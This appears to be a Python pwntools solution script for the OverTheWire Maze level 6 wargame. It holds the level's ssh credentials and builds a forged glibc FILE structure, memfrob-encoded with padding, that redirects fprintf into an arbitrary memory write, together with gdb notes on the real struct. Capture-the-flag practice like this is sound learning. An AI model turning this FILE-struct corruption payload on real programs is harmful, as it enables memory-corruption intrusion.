#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 6
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'epheghuoli'
PORT = 2225

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

#reverse memfrob bytes
def revfrob(s):
    rvrsd = ''
    for c in s:
        rvrsd += chr(c ^ 42)
    return rvrsd
        

#Craft a faked file struct to be pointed to by fprintf - doing so will write to a memory location
#of my choice
def fake_file():
    _flags = 0xfbad3484
    _vtable = 0xf7f98580
    _lock = 0x804a238
    struct = p32(_flags)         #  _flags  
    struct += p32(0x0)           #  _IO_read
    struct += p32(0x0)           #  _IO_read
    struct += p32(0x0)           #  _IO_read
    struct += p32(0x0)           #  _IO_writ
    struct += p32(0x0)           #  _IO_writ
    struct += p32(0x0)           #  _IO_writ
    struct += p32(0x0)           #  _IO_buf_
    struct += p32(0x0)           #  _IO_buf_
    struct += p32(0x0)           #  _IO_save
    struct += p32(0x0)           #  _IO_back
    struct += p32(0x0)           #  _IO_save
    struct += p32(0x0)           #  _markers
    struct += p32(0x0)           #  _chain  
    struct += p32(0x0)           #  _fileno 
    struct += p32(0x0)           #  _flags2 
    struct += p32(0x0)           #  _old_off
    struct += p32(0x0)           #  _cur_col
    struct += p32(_vtable)       #  _vtable_
    struct += p32(0x0)           #  _shortbu
    struct += p32(_lock)         #  _lock   
    struct += p32(0x0)           #  _offset 
    struct += p32(0x0)           #  __pad1  
    struct += p32(0x0)           #  __pad2  
    struct += p32(0x0)           #  __pad3  
    struct += p32(0x0)           #  __pad4  
    struct += p32(0x0)           #  __pad5  
    struct += p32(0x0)           #  _mode   
    struct += p32(0x0)           #  _unused2
    return struct

#binary = ELF("maze6")
#libc = ELF("/usr/lib32/libc.so.6")
#libc.address = 0xf7da7000

#GDB 'file' struct output - need to replicate
#_IO_file_jumps vtable addr = 0xf7f98580
#_flags = 0xfbad3484
#_lock val = 0x804a238

#$1 = {
#  _flags           = -72534908,
#  _IO_read_ptr     = 0x0,
#  _IO_read_end     = 0x0,
#  _IO_read_base    = 0x0,
#  _IO_write_base   = 0x0,
#  _IO_write_ptr    = 0x0,
#  _IO_write_end    = 0x0,
#  _IO_buf_base     = 0x0,
#  _IO_buf_end      = 0x0,
#  _IO_save_base    = 0x0,
#  _IO_backup_base  = 0x0,
#  _IO_save_end     = 0x0,
#  _markers         = 0x0,
#  _chain           = 0xf7f97c40 <_IO_2_1_stderr_>,
#  _fileno          = 3,
#  _flags2          = 0,
#  _old_offset      = 0,
#  _cur_column      = 0,
#  _vtable_offset   = 0 '\000',
#  _shortbuf        = "",
#  _lock            = 0x804a238,
#  _offset          = -1,
#  __pad1           = x0,
#  __pad2           = 0x804a244,
#  __pad3           = 0x0,
#  __pad4           = 0x0,
#  __pad5           = 0,
#  _mode            = 0,
#  _unused2         = '\000' <repeats 39 times>
#}
#print(revfrob(p32(0x69696969)))
print(revfrob(b'FAKEFILE=') + revfrob(fake_file())+'k'*139+'\xff\xff\xff\xff')
